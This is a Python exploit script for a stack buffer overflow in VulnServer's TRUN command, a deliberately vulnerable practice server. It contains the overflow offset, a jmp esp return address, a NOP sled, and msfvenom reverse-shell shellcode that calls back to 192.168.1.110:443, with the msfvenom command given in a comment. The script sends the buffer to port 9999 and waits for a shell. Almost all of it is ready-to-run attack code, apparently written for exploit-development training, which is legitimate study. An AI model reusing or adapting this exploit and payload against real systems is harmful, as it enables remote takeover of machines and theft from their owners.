#!/usr/bin/env python

import socket

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

print(bcolors.BOLD + bcolors.OKBLUE)
print("VulnServer TRUN Stack Overflow\n")
print(bcolors.ENDC)

target = raw_input("Enter target IP: ")

#-----------------------------------------------------------------------------#
# Exploit parameters:                                                         #
# badchars = "\x00"                                                           #
# [*] Exact match at offset 2006                                              #
# Message=  0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll]         #
# ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0-               #
#-----------------------------------------------------------------------------#

BUFFER_SIZE = 3000
offset = "A" * 2006
eip = "\xaf\x11\x50\x62" 
#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.110 LPORT=443 EXITFUNC=thread \
#        -b "\x00" -f py -v shellcode --smallest

shellcode =  ""
shellcode += "\x2b\xc9\x66\xb9\x43\x01\xe8\xff\xff\xff\xff\xc1"
shellcode += "\x5e\x30\x4c\x0e\x07\xe2\xfa\xfd\xea\x81\x04\x05"
shellcode += "\x06\x67\x81\xec\x3b\xcb\x68\x86\x5e\x3f\x9b\x43"
shellcode += "\x1e\x98\x46\x01\x9d\x65\x30\x16\xad\x51\x3a\x2c"
shellcode += "\xe1\xb3\x1c\x40\x5e\x21\x08\x05\xe7\xe8\x25\x28"
shellcode += "\xed\xc9\xde\x7f\x79\xa4\x62\x21\xb9\x79\x08\xbe"
shellcode += "\x7a\x26\x40\xda\x72\x3a\xed\x6c\xb5\x66\x60\x40"
shellcode += "\x91\xc8\x0d\x5d\xa5\x7d\x01\xc2\x7e\xc0\x4d\x9b"
shellcode += "\x7f\xb0\xfc\x90\x9d\x5e\x55\x92\x6e\xb7\x2d\xaf"
shellcode += "\x59\x26\xa4\x66\x23\x7b\x15\x85\x3a\xe8\x3c\x41"
shellcode += "\x67\xb4\x0e\xe2\x66\x20\xe7\x35\x72\x6e\xa3\xfa"
shellcode += "\x76\xf8\x75\xa5\xff\x33\x5c\x5d\x21\x20\x1d\x24"
shellcode += "\x24\x2e\x7f\x61\xdd\xdc\xde\x0e\x94\x6c\x05\xd4"
shellcode += "\xe2\xb8\xbe\x8d\x8e\xe7\xe7\xe2\xa0\xcc\xc0\xfd"
shellcode += "\xda\xe0\xbe\x9e\x65\x4e\x24\x0d\x9f\x9f\xa0\x88"
shellcode += "\x66\xf7\xf4\xcd\x8f\x27\xc3\xa9\x55\x7e\xfc\xfd"
shellcode += "\xfe\xff\xf0\xe1\xf2\xe3\xdc\x5f\xb9\x68\x58\x46"
shellcode += "\x6f\x2c\xd6\xb8\xd6\x7f\x68\xc0\xac\xab\xc6\xc5"
shellcode += "\xc7\x7c\x41\x2f\xa0\xdb\x9a\x9a\xa6\x56\x75\xa5"
shellcode += "\xb3\x2c\x01\x50\x16\xa3\xd4\x26\x94\xd3\xa9\x31"
shellcode += "\xb6\x2f\x55\x43\xb4\x1c\x31\x8d\x85\x8a\x8c\xe9"
shellcode += "\x63\x08\xbb\xba\xb9\xde\x06\x9b\xe0\xaa\xa2\x17"
shellcode += "\x0b\x91\x3f\xbd\xde\xc7\xfd\xfc\x73\xbb\x24\x11"
shellcode += "\xc4\x03\x40\x51\x56\x51\x5e\x5f\x4c\x5d\x42\x5b"
shellcode += "\x58\x5c\x46\x79\x6b\xdf\x2b\x93\xe9\xc2\x91\xf9"
shellcode += "\x54\x4d\x5a\xe2\x2e\x77\x28\xa6\x3f\x43\xdb\xf0"
shellcode += "\x9d\xc7\x35\x03\x20\x43\x8a\xb8\x93\xb2\xcf\xe4"
shellcode += "\x0e\x35\x48\x3f\xb6\xcc\xd8\x4c\x3f\x80\x7b\x2e"
shellcode += "\x4c\x50\x2a\x41\x11\xbc\x91"

malicious = "\x90" * 20 + shellcode
padding = "\xCC" * (BUFFER_SIZE - len(malicious) - len(eip) - len(offset))
evil = offset + eip + malicious + padding 

try:
    s = socket.create_connection((target, 9999),2)
    print(s.recv(1024))
    print(bcolors.OKGREEN + "[i] Sending evil buffer...\n" + bcolors.ENDC)
    s.send("TRUN ." + evil + "\r\n")
    print(bcolors.OKGREEN + "[+] Complete. Standby for shell.\n" + bcolors.ENDC)
    s.close()
except:
    print(bcolors.FAIL + "[-] Something went wrong. Try again.\n" + bcolors.ENDC)
